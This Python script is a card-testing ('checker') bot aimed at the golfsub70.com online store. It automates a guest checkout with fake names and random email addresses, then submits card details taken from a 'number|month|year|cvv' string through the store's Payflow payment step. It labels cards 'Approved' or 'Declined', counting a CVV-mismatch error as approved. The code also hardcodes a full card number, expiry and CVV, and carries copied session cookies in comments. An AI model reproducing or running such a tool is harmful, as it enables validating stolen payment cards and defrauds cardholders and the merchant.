import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent
def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

class Autocomplet:
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    def cut_str(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = Autocomplet().cut_str(self._tokenEncoding, '"authorizationFingerprint":"', '","')

        return self.bear_end

@dataclass
class pafiw:
    def __init__(self, card):


        self.card = card
        self.ccs = card.split('|')
        if self.ccs[0].startswith("4"): self.brand = "VI"
        if self.ccs[0].startswith("3"): self.brand = "AE"
        elif self.ccs[0].startswith("5"): self.brand = "MC"
        session = requests.Session()

    def main(self):
        try:
            session = Session()
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random

            #self.session.proxies = proxies
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://www.golfsub70.com/sub-70-golf-accessories.html?dir=asc&order=price',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; productlist=Category%20-%20Sub%2070%20Golf%20Accessories; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            response = session.get('https://www.golfsub70.com/sub-70-ball-markers.html',  headers=headers).text
            key = paserX(response, 'name="form_key" type="hidden" value="', '"')
            print(key)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.golfsub70.com',
                'priority': 'u=0, i',
                'referer': 'https://www.golfsub70.com/sub-70-ball-markers.html',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; productlist=Category%20-%20Sub%2070%20Golf%20Accessories; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            data = {
                'form_key': key,
                'product': '915',
                'related_product': '',
                'super_attribute[217]': '436',
                'qty': '1',
            }

            response = session.post(
                f'https://www.golfsub70.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuZ29sZnN1YjcwLmNvbS9zdWItNzAtYmFsbC1tYXJrZXJzLmh0bWw,/product/915/form_key/{key}/',
                headers=headers,
                data=data,
            )
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://www.golfsub70.com/sub-70-ball-markers.html',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; productlist=Category%20-%20Sub%2070%20Golf%20Accessories; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            response = session.get('https://www.golfsub70.com/checkout/cart/', headers=headers)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'priority': 'u=0, i',
                'referer': 'https://www.golfsub70.com/checkout/cart/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            response = session.get('https://www.golfsub70.com/checkout/onepage/',  headers=headers).text

            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.golfsub70.com',
                'priority': 'u=1, i',
                'referer': 'https://www.golfsub70.com/checkout/onepage/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            data = {
                'method': 'guest',
            }

            response = session.post('https://www.golfsub70.com/checkout/onepage/saveMethod/', headers=headers, data=data)
            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.golfsub70.com',
                'priority': 'u=1, i',
                'referer': 'https://www.golfsub70.com/checkout/onepage/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            data = {
                'billing[address_id]': '',
                'billing[firstname]': 'ldfl',
                'billing[middlename]': 'mr',
                'billing[lastname]': 'dsdasd',
                'billing[company]': 'ggd',
                'billing[email]': CorreoRand,
                'billing[street][]': [
                    'moall del sol',
                    'sadw',
                ],
                'billing[city]': 'guayas',
                'billing[region_id]': '43',
                'billing[region]': '',
                'billing[postcode]': '10080',
                'billing[country_id]': 'US',
                'billing[telephone]': '0989861371',
                'billing[fax]': '',
                'billing[customer_password]': '',
                'billing[confirm_password]': '',
                'billing[save_in_address_book]': '1',
                'billing[use_for_shipping]': '1',
                'form_key': key,
            }

            response = session.post('https://www.golfsub70.com/checkout/onepage/saveBilling/', headers=headers, data=data)
            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.golfsub70.com',
                'priority': 'u=1, i',
                'referer': 'https://www.golfsub70.com/checkout/onepage/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            data = {
                'shipping_method': 'wigsubship_carrier_standand',
                'form_key': key,
            }

            response = session.post(
                'https://www.golfsub70.com/checkout/onepage/saveShippingMethod/',
                headers=headers,
                data=data,
            )
            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.golfsub70.com',
                'priority': 'u=1, i',
                'referer': 'https://www.golfsub70.com/checkout/onepage/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            data = {
                'payment[method]': 'verisign',
                'payment[cc_type]': 'MC',
                'payment[cc_number]': '5492840390681107',
                'payment[cc_exp_month]': '12',
                'payment[cc_exp_year]': '2028',
                'payment[cc_cid]': '269',
                'form_key': key,
            }

            response = session.post('https://www.golfsub70.com/checkout/onepage/savePayment/',  headers=headers, data=data)

            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.golfsub70.com',
                'priority': 'u=1, i',
                'referer': 'https://www.golfsub70.com/checkout/onepage/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
            }

            data = {
                'payment[method]': 'verisign',
                'payment[cc_type]': self.brand,
                'payment[cc_number]': self.ccs[0],
                'payment[cc_exp_month]': self.ccs[1],
                'payment[cc_exp_year]': self.ccs[2],
                'payment[cc_cid]': self.ccs[3],
                'form_key': key,
            }

            response = session.post(
                f'https://www.golfsub70.com/checkout/onepage/saveOrder/form_key/{key}/',
                headers=headers,
                data=data,
            ).json()
            err = response['error_messages']
                        
                        # payflow woo 18.08
            if data.get("success") is True:
                return 'Approved! ✅', 'Charged 10.85'


            elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in str(err):
                return 'Approved! ✅', err

            else:
                return 'Declined ❌', err

        except Exception as e:
            print(e)
            return 'Declined ❌', str(e)
